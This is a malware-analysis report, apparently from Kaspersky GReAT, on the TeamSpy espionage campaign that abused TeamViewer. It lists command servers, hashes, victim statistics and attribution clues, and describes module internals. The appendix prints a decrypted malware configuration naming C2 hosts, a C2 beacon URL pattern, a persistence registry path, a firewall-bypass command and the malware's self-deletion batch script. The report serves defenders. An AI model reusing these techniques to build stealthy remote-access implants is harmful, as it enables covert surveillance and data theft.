    "plain_text": "# The ‘TeamSpy’ Story - Abusing TeamViewer in Cyberespionage Campaigns\n\n## Kaspersky Lab Global Research and Analysis Team (GReAT) \n\n Version 1.02 - 20 March 2013\n\n Introduction\n\nFor at least several years, a mysterious threat actor infiltrated and tracked, performed surveillance and stole data from\ngovernmental organisations, some private companies and human rights activists throughout the Commonwealth of\nIndependent States (CIS) and Eastern European nations. Some parts of this operation extended into Western nations and the\nMiddle East as well, with victims in sectors such as energy and heavy industry manufacturing. The attackers performed their\n[intelligence gathering and surveillance partly using TeamViewer (http://www.teamviewer.com/en/index.aspx), a legitimate](http://www.teamviewer.com/en/index.aspx)\nsupport software package commonly used for remote administration. In addition, they deployed custom written intelligence\ngathering components and lateral movement utilities.\n\nWe are calling this threat actor the “TeamSpy crew” because of their preference for using the legal software TeamViewer as a\nmain part of their toolset.\n\n## So, Team What?\n\nTeamSpy. This covert cross-nation, cyber surveillance data theft and monitoring operation may not have recruited technical\nwizards for their team. But the use of legitimate, signed software packages in addition to custom made software, along with\nvarious dll path hijack tricks, allowed the threat actor to conduct effective operations targeting hundreds of victims, including\nhigh level/high value individuals.\n\nAccording to its web site, TeamViewer is a “All-In-One Software for Remote Support and Online Meetings”. It is “free for\nprivate use” and is installed by “more than 100,000,000 users spread over more than 200 countries”. TeamViewer has versions\navailable for Windows, Mac OS X, Linux, iPhone or Android, making it a very flexible remote administration tool.\n\n\n-----\n\n_The TeamViewer web site_\n\nCompared to Poison Ivy and other Remote Access Tools (RATs) that have been in the news for years, TeamViewer has an\nadvantage which makes it attractive to cybercriminals: is comes signed, adding to its seeming legitimacy.\n\nIn addition to TeamViewer, the TeamSpy operations are supplemented by a variety of custom-built surveillance modules.\nInstead of maintaining all operations with the TeamViewer RAT, the team developed their own reconnaissance and stealth\nmodules. These provide TeamSpy attackers with the following functionality:\n\n\n-----\n\n|Module name|Purpose|\n|---|---|\n|Bi|Detailed operating system and BIOS information collection|\n|Keylogger, sc_and_console|Keylogging and screenshot capture|\n|GetIOSData|Attached device history collection via iTunes|\n|SystemInfoSafe|Alert-avoiding system information collection|\n|FileList2|Local file information listing based on attackers' interests|\n|NetscanFiles2|Remote shares file listing; Hunts secret content, secret/private crypto keys, passwords|\n|NetScanShares2|List available network shares and network accessible servers/domains.|\n|SystemInfo|General system and user account information collection|\n|Avicap32|Extend TeamViewer remote control functionality to ensure stealth and persistence, self defense from automated and manual analysis and discovery, maintain communications and updates with attackers’ command-and-control|\n\n\nOne interesting “fingerprint” of this operation is the inclusion of custom, hand-drawn icons in some of the attack tools.\nExamples include:\n\nIt seems that at least at heart, one of the TeamSpy crew members dreams of being a graphic artist. Or maybe they tried to\nsend security researchers a hidden message?\n\n## Observations about the TeamSpy Toolset - “No find glue file!”\n\nThe toolset demonstrates clever, although lazy choices about legitimate software and certificate abuse, along with a minimal\nbut effective effort at using simple and crude custom encryption algorithms.\n\nWe’ve analyzed in depth two command and control servers used by the attackers but we are aware of several others used in\nthe campaign. The two servers we analyzed are “politnews.org” and “bannetwork.org”.\n\n\n-----\n\nOn the command and control servers, the attackers maintain tools and modules, some obfuscated and named as JPG files. The\n“.JPG” files maintain hidden executable codes, and are simply encoded with a rolling XOR encryption using the same key across\nall of the components: “0x0e0f101112”.\n\nThere are quite a few traces left by the attackers, which normally can give you hints about attaсkers’ profile.\n\nFor example, a keylogger tool used a system event called \"__klgskot__\". While \"klg\" stands for keylogger, \"skot\" is a Russian\nword meaning \"livestock\".\n\nThere are many more Russian language traces in this malware toolkit. The version of Teamviewer server which is used as a\npart of malware bundle is Russian localized. It at least includes TeamViewer_Resource_ru.dll file which has a set of Russian\nstrings used by the application.\n\nA couple of other modules, while searching for files on the hard drive, looked for those containing \"pass\", \"secret\", and\nRussian equivalents \"парол\" and \"секрет\". In addition to Russian, there was a Georgian equivalent of \"secret\", but written in\nthe Latin alphabet: \"saidumlo\".\n\n[In the recent Red October report, our research noted liberal use of Cyrillic characters throughout code and files...“Another](http://www.securelist.com/en/analysis/204792262/Red_October_Diplomatic_Cyber_Attacks_Investigation#4)\nnoteworthy fact is in the first line of this file, which is a command to switch the codepage of an infected system to 1251. This is\nrequired to address files and directories that contain Cyrillic characters in their names”. Here is a screenshot demonstrating\nthe system codepage switch in a malicious batch file:\n\n_Usage of CP1251 in Red October_\n\nJust like Red October, TeamSpy components maintain the same sort of language switch to Cyrillic throughout code and files.\nHere, we note that an entire TeamSpy SQLite database’s strings used to house stolen victim data, located on one of the major\nC2, is specified to default to the Cyrillic character set.\n\n\n-----\n\nTables within the database are explicitly configured to use the Cyrillic character set. Here is the log table, filled with victim\ncheck-in records:\n\nThe statistic table, along with all of the others, are explicitly Cyrillic:\n\nAlso, some specifics come from C&C domain names, such as \"bulbanews.org\" and \"kartopla.org\". The words \"bulba\" and\n\"kartopla\" are written in Latin-Belarusian and Latin-Ukrainian, both words mean “a potato”. Interestingly, among ex-USSR\ncountries, Belarusians are jokingly called \"bulbashi\" which means \"potato people\" due to the popularity of this vegetable in\nlocal agriculture.\n\nOne of the modules we found, called footer has LANG_RUSSIAN property set in the resource section of the executable.\n\nAlso, one of the database tables discovered at a C&C server contained some text in Russian written with latin alphabet:\n\n\n-----\n\nA rough translation of the highlighted strings from Russian to English:\n\n\"Obshie manevri. Ispolzovat' tolko s razreshenija S-a\" = \"General maneuvers. Use only after approval of S-a\".\n\n\"vkluchenie oomask\" = \"switching oomask on\"\n\n\"Ispolzovanie bilda ...\" = \"Using build ...\"\n\nThe same C&C we analyzed had a full FTP access log with source IP that uploaded malicious modules in 2012 (some of them\nwere already removed from the server, but the names and sizes remained in the log file). This log file also shows intensive\nusage of Russian language in the file names:\n\nThe filenames include \"можно выдавать\" which is translated as \"ready to spread\", \"Проверка на прото\" meaning \"Protocol\n**checks\". The most amusing part of this log is \"crypted_bulba\" which is translated as \"encrypted potato\". Everyone is familiar**\nwith baked potato or mashed potato, however this is our first touch with \"encrypted potato\".\n\nThe SystemInfoSave module lists all files in the “Program Files” folder which are newer than the hard-coded date: “22\n**November 1963”. The date is clearly an “Easter Egg”, with several important incidents linked this specific date:**\n\n#### ● US President John F. Kennedy is assassinated in Dallas.\n ● Aldous Huxley, the author of “Brave New World” and many other titles, dies.\n ● CS Lewis, the author of “Chronicles of Narnia” and many other titles, dies.\n\n## Maintaining Teamwork and Infrastructure\n\nOur investigation of the team’s infrastructure centers around two domains used for command-and-control: “politnews.org”\nand “bannetwork.org”. But clearly, the strategy guiding this team is to pull off multiple “watering hole” attacks, and\nsometimes pollute ad networks, inefficiently blanketing the region they are most interested in with malvertizing and\nredirections to their malicious sites. These two servers have been heavily used over years of attack campaigns, with more\nrecent servers receiving tens if not hundreds of hits in the past week.\n\n“politnews.org” was originally registered on the June 18th, 2004 by one “Zacepenko Ilia Igorevich” at OnlineNIC Inc:\n\n**Zacepenko Ilia Igorevich**\n\n**9th square, 10-1,1**\n\n**NI Larne, GB 127591**\n\n**politnews@mail.ru**\n\n\n-----\n\n“bannetwork.org” was originally registered on September 2nd, 2004 by one “Dmitryi Ivastov” at OnlineNIC Inc as well:\n\n**Dmitryi Ivastov**\n\n**Mira street, 1a**\n\n**Moscow, RU 103555**\n\n**bannetwork@mail.ru**\n\nWe believe that these are fictional identities and used only to register these individual domains.\n\nThe two servers resided at several hosts over the past decade, but from 2010, both domains were maintained at Russian\nprovider Host Telecom. (known malicious IP for “bannetwork.org”: “89.188.104.7”).\n\nFor the most part, these systems maintain identical toolsets, structure, software and accounts. Both of these systems hosted\nan FTP server and an Apache HTTP web server, along with the same user accounts for running each. The HTTP servers were\nused to serve “job.txt”, which maintained a set of system commands for agents checking in, among other files described\n[below. Interestingly, other files included “html” pages and exploits related to the well-known exploit kit “Eleonore Exploit](https://threatpost.com/en_us/blogs/anatomy-eleonore-exploit-kit-060310)\n[Pack”, created and maintained by Exmanoize.](https://threatpost.com/en_us/blogs/anatomy-eleonore-exploit-kit-060310)\n\nAlso, one of the server scripts to collect infection success statistics mentions the Eleonore exploit kit by name:\n\nAnd one of the more recent, current sites, “checkmeil.com”, is serving both malicious java and pdf files. Of course, just like\nEleonore started serving couple of years ago, it defaults to deliver a malicious JAR file first, prior to other exploits potentially\nsent to the victim system.\n\n\n-----\n\nThe 2012 version of “door.jar” (CVE-2012-0507) exploit is blocked proactively by our AEP functionality at runtime and detected\nby Kaspersky products as “HEUR:Exploit.Java.CVE-2012-0507.gen\".\n\nA malicious PDF is served if the Java Runtime is not present on the system. Our products detect this particular malicious file as\nExploit.JS.Pdfka.gbf.\n\n[Most of the TeamSpy servers are using a free, Russian open source tool named “ReaderRssPhp 1.0”. This is a set of PHP scripts](http://www.newsrss.ru/readerrssphp/index.php)\ndesigned to “read and display RSS feeds on your site”. Most likely, the attackers planned their attacks well in advance and built\na set of web sites using these scripts to provide news aggregation channels serving content at least somewhat relevant to their\ntarget victims’ favorite web sites.\n\nOver the past years, the attackers added exploit packs like Eleonore on their news aggregation sites. Then, the attackers\ninjected iframes into carefully selected web sites frequently visited by their target victims. The iframes redirect these target\nvisitors (and some extras) to their previously-prepared malicious sites. For instance, redirections from “konflikt.ru” to the\nattackers’ “bannetwork.org” started in October 2005. In February 2006, users were redirected from “daymohk.org” to\n“bannetwork.org”, followed by “www.turkmenistan.gov.tm” and “chechentimes.net” in March. The list of infected watering\nhole sites continued to grow from there.\n\n\n-----\n\nAttacks from the “bannetwork.org” site appear to have been related to the following links by at least February 2010:\n\n**bannetwork(dot)org/5058/spl/**\n\n**bannetwork(dot)org/5058/spl/inc/function.php**\n\n**bannetwork(dot)org/5058/spl/ms-041.jpg**\n\n**bannetwork(dot)org/5058/spl/vx_2c.exe**\n\n**bannetwork(dot)org/5058/spl/new-ms-041.jpg**\n\nBased on the server access stats, we were able to put together a thorough list of web sites which appear to have acted as\nreferrers to the exploit packs. Since the early infections, it appears that they have been compromised and redirecting visitors\non and off until recently:\n\n**daymohk.org**\n\n**chechenpress.info**\n\n**daymohk.chechenpress.org**\n\n**chechentimes.net**\n\n**caucasuslive.org**\n\n**kauna-talu.com.ua**\n\n**timorseada.org**\n\n**mediaf.org**\n\n**ichkeria.info**\n\n**kavkazanhaamash.com**\n\n**rusedina.org**\n\n**konflikt.ru**\n\n**forum.ladoshki.com**\n\n**shaheeds.org**\n\n**hghltd.yandex.com**\n\n**turkmenistan.gov.tm**\n\n## Victim Checkins and Volume\n\nThe command-and-control servers maintain a database of victims with their associated TeamViewer IDs and passwords. These\ncan be seen in the C2 online interface which lists the IP, last access time and the user status:\n\n\n-----\n\nThe attacker can then connect to any of the online IPs using the known login/pass combination and silently spy on the victims.\n\n## Command Server Directory Structure and Contents\n\nThe command and control servers we analyzed maintain the same “/public_html” file contents.\n\n|MD5|filename|purpose|\n|---|---|---|\n|0926bf7a4623d72311e43b16d667ae1a|DSC.exe|Malware dropper|\n|3299885cf257d6482ee0f2132585e9c6|TeamViewer.ico|TeamViewer installer|\n|eab5e4d1bff2b132f6dd21f2cf9bb7a0|bi.jpg|Encrypted, see Bi Tool, Appendix A|\n|38e00a13ebeb5959d89fe81e82866896|[removed for security reasons]|List online and offline victims with TeamViewer access info|\n|74fc74f8b21d9b43a423471889a103cc|[removed for security|Dump C2 statistics to a specific|\n\n\n-----\n\n|Col1|reasons]|file on the server|\n|---|---|---|\n|Varies|[removed for security reasons]|Error log for the scripts|\n|83a1634f660d22b990b0a82b1185de5b|getiosdata.jpg|Encrypted, see GetiOSData tool, Appendix A|\n|a1e237206869a46fc833f1c4ee209654|index.htm|Main page - shows empty message|\n|d41d8cd98f00b204e9800998ecf8427e|job.txt|Leftover from unknown scripts|\n|e31423960c7057a40a7ebd4c017a5e8b|klg.jpg|Encrypted, see Keylogger tool, appendix A|\n|e165a2ac3aa6d072a0d89a47f99f05b3|sc_and_console.jpg|Encrypted, see sc_and_console (screenshot and console) tool, appendix A|\n|3f8d93a3b71c8b396e35cfca0a83af50|stat.php|Used by infected clients to report to C2|\n|856b130dc8002c3ecdce5fb43f23312f|stat.txt|Statistics created by “stat_old.php”|\n|58e775ab85f180fd60269cad300e56d1|stat_old.php|Old statistics script|\n|43831cfe169810cf06bb430b860d2f3f|under_construction.gif|“under construction” icon|\n|671a7fe2e0cc01ce07c5c6b80b92dfd6|user_offline.gif|Icon for offline users|\n|7b4ef82be7510173a6fabe79f74158bc|user_online.gif|Icon for online users|\n\n\n-----\n\nFor logging infections and handling infected users, all C2 servers rely on a MySQL database to which all the scripts connect. The\nusername and password for the database connections are hardcoded in the C2 scripts, for instance:\n\nSeveral tables exist in the databases, named “stat_TV”, “stat_TV_log”, “stat”, “stat2”, “stat5058”, “statistic”. These carry\nvarious information about the victims that connected to the C2 as well as unique data that allows the attackers to interact\nwith them.\n\n## Lesser Used Spy Tools\n\nIt seems that attackers outsourced much of their infiltration development work, utilizing exploit kits like Eleonore and others.\nIt is the upfront investment of vulnerability research and exploit development and expertise that are beyond the reach of\nmany interested parties like TeamSpy that results in this outsourcing. In addition to the commodity exploit packs, their sites\nare also known to spread the Ardamax keylogger, another cheap, commercially available surveillance package.\n\niexplore.exe (compiled Thu April 08 12:14:44 2010)\n\nMD5: 512c13c374cdaabb00bf98256872c813\n\nKaspersky name: Trojan-Spy.Win32.Ardamax.dmn\n\nSends stolen information to hxxp://www.politnews.org/dd_4.php, hxxp://www.bannetwork.org/dd_4.php\n\niexplore.exe (compiled Thu March 04 17:44:44 2010)\n\nMD5: 76c33bf350ca7447730e8a37f2d93000\n\nKaspersky name: Trojan-Spy.Win32.Ardamax.dkm\n\nSends stolen information to hxxp://www.politnews.org/dd_4.php, hxxp://www.bannetwork.org/dd_4.php\n\n\n-----\n\niexplore.exe (compiled Tue Feb 08 06:58:58 2011)\n\nMD5: be612d16b07c59d22b47f9313c44437c\n\nKaspersky name: Trojan-Spy.Win32.Ardamax.mei\n\nSends stolen information to: hxxp://www.politnews.org/dd_4.php, hxxp://www.news-top.org/dd_4.php\n\n## Statistics and Victim Profiles\n\nKaspersky Security Network is Kaspersky’ cloud security services. It collects statistics on malware incidents from around the\nworld. The TeamSpy attacks have been recorded in several countries around the world, with the highest number of incidents\nbeing in Russia and Ukraine. Here’s a map of infections:\n\n_“Teamspy” KSN detections (unique PCs) - March 2013_\n\nIn addition to the KSN reports, we were able to extract a list of victims from two command and control servers’ databases.\nThese are available to anyone who knows the URL which serves these lists.\n\nFor “bannetwork.org” we have the following list of registered victims:\n\n|Country|Count|%|Col4|\n|---|---|---|---|\n|RU|1433|82.78||\n|TR|84|4.85||\n|IR|37|2.14||\n\n\n-----\n\n|SE|35|2.02|\n|---|---|---|\n|FR|31|1.79|\n|US|20|1.16|\n|KZ|17|0.98|\n|BE|12|0.69|\n|CH|11|0.64|\n\n\nFor “news-top.org”, we have the following list of victims:\n\n|Country|Count|%|\n|---|---|---|\n|TR|55|33.33|\n|RU|37|22.42|\n|IN|22|13.33|\n|DE|15|9.09|\n|US|13|7.88|\n|SA|10|6.06|\n|BE|5|3.03|\n|ES|3|1.82|\n|NO|3|1.82|\n|GB|1|0.61|\n|IR|1|0.61|\n\n\n-----\n\nIn both cases, Russia and Turkey appear as top targets, with other countries such as India, Sweden, Iran or US following.\n\nIt should be noted that the statistics from the command and control servers include only the victims that were infected with\nthe Teamviewer-based package. The command servers have bigger logs which possibly include many other victims, although\nthe nature of these is impossible to determine because the respective database tables are not handled anymore by the\nexisting scripts.\n\nFor instance, the C2 at “bannetwork.org” has an extended log of supposed victims, spanning for two years, with the earliest\nentry from 23 Sep 2011 and the latest from March 2013.\n\n_Number of unique victims per month handled by the bannetwork.org C2_\n\nA peak can be observed on Jan 2012 - when the attackers infected a large amount of victims, 323.\n\nIn regards of victim’s profiles, in general, the IPs do not appear to hold useful information. Some do belong to specific\nnetworks, however, it’s unclear if they are researchers or true victims. A top of the ISPs for the victims at “bannetwork.org”\ninclude:\n\n|ISP name|Victims|\n|---|---|\n|INGUSHELECTROSVYAZ|680|\n|PARS ONLINE|17|\n|TURK TELEKOMUNIKASYON ANONIM SIRKETI|15|\n|AZADNET RESANEH|11|\n\n\n-----\n\n|DYNAMIC IP POOL FOR BROADBAND CUSTOMERS|9|\n|---|---|\n|JSC KAZAKHTELECOM ALMATY AFFILIATE|9|\n|DJIBOUTI TELECOM S.A.|8|\n|JSC KAZAKHTELECOM PAVLODAR AFFILIATE|7|\n|SCARTEL LTD.|7|\n|FARHANG AZMA COMMUNICATIONS COMPANY LTD|6|\n|KYIVSKI TELEKOMUNIKATSIYNI MEREZHI LLC|4|\n|AKADO-STOLITSA JSC|2|\n|ALLTELE ALLMANNA SVENSKA TELEFONAKTIEBOLAGET|2|\n|ASIANET IS A CABLE ISP PROVIDING|2|\n\n\n## Links with “countlist.org” and Alexander Sokolov\n\nWe were able to identify several older samples which connect to the command and control domain “countlist.org”. This\ndomain appears to have been an active C2 between May 2010 - May 2011. The Google safe diagnostic page for this domain\npoints to an interesting blog:\n\n\n-----\n\nThe domain “master-sudtyaib.narod.ru” appears to host a blog dedicated to freeing the Russian political activist “Alexander\n[Sokolov” (for details: http://www.fidh.org/IMG//pdf/obs_report_russia_sokolov.pdf) . The page does not appear to be](http://www.fidh.org/IMG/pdf/obs_report_russia_sokolov.pdf)\nmalicious at the time of writing of this analysis, however, the file “sokolov.html” does have an injected iframe which points to\nanother domain:\n\nThe iframe points to “countlist.org/xmps5060”, which was no longer available when we tested it. The domain “countlist.org”\nhas been sinkholed by Kaspersky Lab for security reasons.\n\n\n-----\n\n“countlist.org” is connected with the other sites - in 2010, it served PDF exploits and a dropper that delivered the Ardamax\nkeylogger, which reported monitored keystrokes back to both “bannetwork.org” and “politnews.org”:\n\nAccording to KSN data, “countlist.org” served multiple versions of malicious PDF exploits from these URLs:\n\n**countlist(dot)org/5061/**\n\n**countlist(dot)org/5062/**\n\n**countlist(dot)org/5062/pdf.php**\n\n**countlist(dot)org/5062/pdf.php?spl=pdf_all**\n\n**countlist(dot)org/xmps5060/**\n\n**countlist(dot)org/xmps5060/index.php**\n\n**countlist(dot)org/xmps5060/index.php?spl=2**\n\n**countlist(dot)org/xmps5060/index.php?spl=3**\n\n**countlist(dot)org/xmps5060/index.php?spl=4**\n\n**countlist(dot)org/xmps5060/pdf.php?spl=pdf_all**\n\n**countlist(dot)org/xmps5060/pdf.php?spl=pdf_ff**\n\n**countlist(dot)org/xmps5060/pdf.php?spl=pdf_op**\n\nBelow are details of the payload delivered by the PDF exploits:\n\nbutton.jpg (compiled Mon July 26 10:08:26 2010)\n\nServed from hxxp://countlist(dot)org/xmps5060/button.jpg in August 2010\n\nMD5: c220a5ae869a1e3e9f5e997f8bf57e82\n\nUsing a set of embedded batch scripts, this dropper copies itself to “c:\\documents and settings\\All Users\\Application\nData\\iexplore.exe” on the user’s system and attempts to add this path to the current users’ Run registry key for persistence.\n\nKaspersky name: Trojan-Ransom.Win32.PornoBlocker.aei\n\nSends stolen information to hxxp://www.politnews.org/dd_4.php, hxxp://www.bannetwork.org/dd_4.php\n\n## Other Teamviewer based campaigns\n\nWe were first alerted by attacks from unknown assailants which were using runtime patched Teamviewer as part of their\n[toolset in May 2012. The attacks (see https://charter97.org/ru/news/2012/4/28/51488/, story in Russian) were using a](https://charter97.org/ru/news/2012/4/28/51488/)\nnumber of .RU domains as command and control, namely “kosmoaministrator.ru”, “adminplagin.ru” and “korakura.ru”. These\ndomains are now sinkholed by Kaspersky Lab.\n\n\n-----\n\nIn addition to these attacks, we discovered a number of other command and control servers used by attackers which employ\nthe Teamviewer-based attack toolkit.\n\nBased on our research, it seems the Teamviewer based trojans appeared in the Russian underground forums a couple of time\nago and were readily available for purchase by interested parties.\n\nAt the moment, it is unclear if there is a connection between all these attackers (such as the ones from the charter97.org\nstory) and the “TeamSpy Crew”. The TeamSpy Crew differentiates itself by mostly using “.org” domains for command and\ncontrol. On these command and control servers, they maintain a specific infrastructure and directory structure, for instance,\nserving the malicious “TeamViewer.ico” installer.\n\n## Conclusions\n\nAccording to existing information, the TeamSpy crew has been active at least since 2008, possibly going back to as early as\n2004 if we are to believe the domain registration dates and consider the news aggregation channels. During the years, the\nteam has been focusing on attacking a variety of targets, ranging from activists and political to heavy industry and national\ninformation agencies.\n\nSome of the aspects of this operation, such as keywords and usage of Russian terms remind us of Red October, although there\nare no direct links at the moment. If we are to compare it to Red October, the TeamSpy Crew and the tools they use are far\nless sophisticated and professional.\n\nTo attack their targets, the TeamSpy crew relied on a variety of custom tools, designed to collect “special” and interesting\ndocuments, such as those containing the word “secret” in their names. The special name “saidumlo” (Georgian - “secret”)\nprobably indicates at least some of the victims were in Georgia or from Georgia.\n\nThe most recent method used by the TeamSpy crew involved the using of Teamviewer, a legal remote administration tool.\nSince Teamviewer is normally used in a wide range of conditions, it is not normally detected by security software with default\nsettings. In addition, the modules are validated with digital signatures, once again, making them “trustworthy” to a range of\nwhitelisting software.\n\nUnlike Red October, where many IPs could be traced to Governments and Governmental institutions based on WHOIS data, in\nthis case, the vast majority of IPs belong to ISPs which do not advertise such information. In case of TeamSpy crew, except for\na very few cases, the identity of the victims remains a mystery.\n\n\n-----\n\n### Appendix A.

If this file is stored in the\nsame folder as TeamViewer.exe, then when TeamViewer is started it will show no warning, no popups, no systray icons and\nwill silently continue working providing remote access to the infected machine. This module not only disables TeamViewer\npopups but also extends its functionality to the classical HTTP bot supporting a set of commands. This module installed with\nTeamviewer 6 allows the attackers to access computer desktop remotely, activate webcam or microphone, download or\nupload files to the infected machine and many more.\n\n## DllMain\n\nThe Module execution starts from the initialization procedure. First, the code searches for “tv.cfg” file in local directory and\nthen common system paths, such as C:\\Windows, C:\\Windows\\System32.\n\nThe code uses non-standard way to pass some arguments to the called function. This is most likely done to harden manual\nanalysis or break automated analysis of the code.\n\n|MD5|Compilation date|Linker version|\n|---|---|---|\n|Different on every system|2012.10.22 13:53:11 (GMT)|1.67|\n\n\n-----\n\n_Non-standard push of the “tv.cfg” string offset to the stack_\n\nIf the tv.cfg file wasn't found the process exits. If it was found, the module gets unique system ID, which is a hashed value of\nsystem drive Volume Serial Number. To hash the Volume Serial Number two types of hash algorithms are used: custom\nSHL/SHR/OR-based algorithm and then MD5. The result is stored in a hex-string which is used as a decryption key for the tv.cfg\nand part of the code in current file. Alternatively a hash of 792 bytes of executable code from TeamViewer.exe is used for\ntv.cfg decryption.\n\nAfter that the module decrypts tv.cfg using RC4 algorithm. An example of decrypted tv.cfg is presented below:\n\n**szUserAgent \"Mozilla5.0\"**\n\n**szadminstat \"tv/getinfo.php\"**\n\n**szadminhost \"newslite.org\"**\n\n**szfilehost \"\"**\n\n**nTimeOut \"10000\"**\n\n**nStartIdleTime \"60\"**\n\n**nregKey \"\"**\n\n**szSubKey \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"**\n\n**szValueName \"svchost\"**\n\n**szteampass \"1234\"**\n\n**nVideo \"4\"**\n\n**szlogftp \"bannetwork.org\"**\n\n**szusername \"[removed]\"**\n\n**szpassword \"[removed]\"**\n\n**szlogkey \"sysenter\"**\n\n\n-----\n\n**szlogstat \"log.php\"**\n\n**szpostdata \"id=\"**\n\n**nkilltvwin7 \"\"**\n\n**nkilltvwinXp \"\"**\n\n**nfakedel \"1\"**\n\nAfter decrypting the config, the module checks if “szadminhost” is found inside. If it is not there, the executions stops.\n\nThen the module decrypts string data and extra code from its own data and code section. The data is stored in TLS section of\nthe parent process.\n\nAfter using some of the file parts, the module overwrites them with 0-byte values to change the module in memory and\npossibly avoid detection or dumping of the module. This is the end of initialization part.\n\nNext, it starts main procedure, which loads export functions from the real avicap32.dll located in system directory\n(C:\\Windows\\System32\\). It also gets current Windows OS version and creates autorun key, under value specified in the tv.cfg.\nCurrently it is\n\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost\n\nThen the module patches the hosting TeamViewer process. It intercepts calls to the following system API functions:\n\nadvapi32.dll: RegCreateKeyExW\n\nadvapi32.dll: RegQueryValueExW\n\nkernel32.dll: CreateProcessW\n\nkernel32.dll: CreateMutexA\n\nkernel32.dll: CreateFileW\n\nkernel32.dll: CreateDirectoryW\n\nkernel32.dll: DeleteFileW\n\nshell32.dll: ShellExecuteExW\n\nuser32.dll: SendMessageW\n\nuser32.dll: CreateDialogParamW\n\nuser32.dll: GetClassInfoExW\n\nuser32.dll: RegisterClassExW\n\nuser32.dll: CreateWindowExW\n\nuser32.dll: IsWindowVisible\n\nuser32.dll: GetDlgItem\n\n\n-----\n\nuser32.dll: ShowWindow\n\nuser32.dll: SetWindowTextW\n\nuser32.dll: MessageBoxW\n\nwintrust.dll: WinVerifyTrust\n\nOne of the functions, SetWindowTextW, is quite interesting and contains extra code to work with C2. This functions when it is\nexecuted the first time has a trigger to start a couple of new threads that communicate with C2 server to ping it and get\ncommands via HTTP GET request using parameters specified in tv.cfg:\n\n**http://<server>/tv/getinfo.php?id=...&pwd=...&stat=1**\n\nThe server is expected to answer with one of the command from the list below:\n\nNext, it creates a Windows Firewall rule to allow outgoing connections for the current process, by running: “netsh firewall set\n**allowedprogram <Path to the TeamViewer executable> tv”**\n\nAfter that the module creates several threads, described below and proceeds to the second stage.\n\nIn the second stage the module loads “kl.dll” library from the current directory and imports two functions: “Init” and “Rdp”.\n\nAfter that it calls “Init” function, waits 32 milliseconds allowing kl.dll to initialize and calls “Rdp” function from the same\nlibrary. The result of that call is submitted to the C2 via HTTP Post with Content-Type: application/x-www-form-urlencoded\n**header value.**\n\n\n-----\n\nIn parallel a new thread is created, which waits for a signal to search *.bin files in the module directory, encrypt with szlogkey\nvalue from tv.cfg using RC4 algorithm and upload to the FTP server specified in the tv.cfg. After uploading the files are deleted\nfrom the filesystem using simple DeleteFileA API call.\n\n## Thread #1 (bot updater):\n\nLocates current process main executable and checks file version and file attributes. If the file version, stored in the file version\ninfo section is not equal to “6.0.10722.0” the process terminates. If the attributes do not contain Hidden, System, then the\nattributes are set (Hidden and System) for the file and the process is restarted. After that it will connect to the Command and\nControl (C2) server and fetch updated modules\n\nby the following URLs:\n\n**http://<server name>/<filename>, where**\n\n**<server name> is a value from tv.cfg file (newslite.org).**\n\n**<filename> is one of the values from the ebedded encrypted string list:**\n\n#### ● TeamViewer_Desktop.exe\n ● tv_w32.exe\n ● tv_x64.exe\n ● TeamViewer_Resource_ru.dll\n ● tv_w32.dll\n ● tv_x64.dll\n\n## Thread #2 (self-removal):\n\nThis thread creates a subthread which waits for a special event. If other thread fires the event, the current thread goes\nthrough a list of embedded filenames, which includes\n\nkl.dll, avicap32.dll, tv.cfg and changes file attributes to Hidden and System (which removes ReadOnly if set). After that, the\nmodule deletes the following registry keys:\n\n**(HKLM or HKCU)\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost**\n\n**HKCU\\Software\\TeamViewer\\Version6\\MachineFallback**\n\n**HKCU\\Software\\TeamViewer\\Version6**\n\n**HKCU\\Software\\TeamViewer**\n\nAfter that the thread creates and executes a batch file named “1.bat” with the following contents:\n\n@echo off&chcp 1251>nul\n\n:try\n\ntimeout /t 5\n\nattrib -h -s -a -r <Current Executable>\n\n\n-----\n\ndel <Current Executable>\n\nif exist <Current Executable> goto try\n\nattrib -h -s -a -r <tv.cfg Full Path>\n\ndel <tv.cfg Full Path>\n\nif exist <tv.cfg Full Path> goto try\n\nattrib -h -s -a -r <TeamViewer_Desktop.exe Full Path>\n\ndel <TeamViewer_Desktop.exe Full Path>\n\nif exist <TeamViewer_Desktop.exe Full Path> goto try\n\nattrib -h -s -a -r <tv_w32.exe Full Path>\n\ndel <tv_w32.exe Full Path>\n\nif exist <tv_w32.exe Full Path> goto try\n\nattrib -h -s -a -r <tv_x64.exe Full Path>\n\ndel <tv_x64.exe Full Path>\n\nif exist <tv_x64.exe Full Path> goto try\n\nattrib -h -s -a -r <tv_w32.dll Full Path>\n\ndel <tv_w32.dll Full Path>\n\nif exist <tv_w32.dll Full Path> goto try\n\nattrib -h -s -a -r <tv_x64.dll Full Path>\n\ndel <tv_x64.dll Full Path>\n\nif exist <tv_x64.dll Full Path> goto try\n\nattrib -h -s -a -r <kl.dll Full Path>\n\ndel <kl.dll Full Path>\n\nif exist <kl.dll Full Path> goto try\n\n\n-----\n\nattrib -h -s -a -r <1.bat Full Path>\n\ndel <1.bat Full Path>\n\nif exist <1.bat Full Path> goto try\n\n## Thread #3 (watchdog):\n\nThis thread simply monitors creation of dangerous processes, such as taskmg.exe or procexp.exe. If it finds any of these\nprocesses running, it immediately terminates three processes (which ids are stored in current module memory) and current\nprocess. This is done in a never-ending loop with high priority – sleep time between check iterations is 1 millisecond. The\nalgorithm designed to have different process termination procedures for Windows NT 5.x and Windows NT 6.x, however\ncurrently it simply calls ExitProcess API function.\n\n## Thread #4 (temp-cleaner):\n\nThis thread searches for tvicap32.dll and tl.dll files in the directory of current executable. It unloads tl.dll, if it is loaded and\nthen attempts to delete both files in a loop with delay of 1 second until it succeeds.\n\n## GetIOSData tool\n\nKnown variants:\n\n**MD5** **Compilation date** **Linker version**\n\n83a1634f660d22b990b0a82b1185de5b 1992.06.19 22:22:17 (GMT) 2.25\n\nThe file is a PE EXE file created in Borland Delphi.\n\nThis file is a tool to collect all local *.plist files from user's Application Data directory. Plist or property list files are files that\nstore serialized objects on Apple operating systems. These files may appear in Apple iTunes folders and may contain\ninformation about devices connected to the current system in the past.\n\n## Main\n\nThis simple module gets searches for “*.plist” files in current user %APPDATA% directory. All discovered files are immediately\ncopied to a directory with hardcoded path “%SYSTEMDRIVE%:\\ProgramData\\Adobe\\AdobeArm”, where %SYSTEMDRIVE% is\nthe system disk drive.\n\nIf the directory “%SYSTEMDRIVE%:\\ProgramData\\Adobe\\AdobeArm” doesn't exist, the copying process silently 